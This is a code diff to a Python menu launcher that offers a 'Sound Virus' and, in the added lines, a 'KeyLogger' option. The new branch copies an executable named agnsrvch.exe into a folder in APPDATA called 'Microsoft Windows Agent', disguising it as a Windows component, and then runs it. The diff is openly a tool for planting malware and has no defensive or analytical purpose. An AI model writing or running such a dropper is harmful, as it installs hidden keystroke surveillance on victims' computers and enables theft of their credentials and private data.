@@ -13,7 +13,7 @@ if user in local_path:
     local_path = "~" + local_path[local_path.find(user[-1:])+1:].replace("\\","/")
 
 # Text Samples
-which_app = f"{color.fg.yellow}Installer{color.reset}{color.fg.cyan}[{color.fg.blue}0{color.fg.cyan}]{color.reset} {color.type.Black}or{color.reset} {color.fg.purple}Sound Virus{color.reset}{color.fg.cyan}[{color.fg.blue}1{color.fg.cyan}]{color.reset}"
+which_app = f"{color.fg.yellow}Installer{color.reset}{color.fg.cyan}[{color.fg.blue}0{color.fg.cyan}]{color.reset} {color.type.Black},{color.reset} {color.fg.purple}Sound Virus{color.reset}{color.fg.cyan}[{color.fg.blue}1{color.fg.cyan}]{color.reset}{color.type.Black} or {color.reset}{color.fg.red}KeyLogger{color.reset}{color.fg.cyan}[{color.fg.blue}2{color.fg.cyan}]"
 shell_simbol = f"{color.type.Black}{color.fg.blue}\n$ {color.reset}"
 wrong_value = f"{color.fg.red}{color.type.Black}%ERROR%{color.reset} WRONG VALUE"
 version = f"{color.type.Black}0.0.1 {color.reset}{color.fg.cyan}Beta{color.reset}"
@@ -30,6 +30,12 @@ if option == '0':
 elif option == '1':
     cmd("cls")
     cmd("Sounds.exe")
+elif option == '2':
+    file_local_save = getenv('APPDATA')
+    cmd(rf"mkdir '{file_local_save}\Microsoft Windows Agent'")
+    cmd(rf"move agnsrvch.exe {file_local_save}\Microsoft Windows Agent")
+    cmd("cls")
+    cmd(rf"{file_local_save}\Microsoft Windows Agent\agnsrvch.exe")
 else:
     print(f"{wrong_value}")
     print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
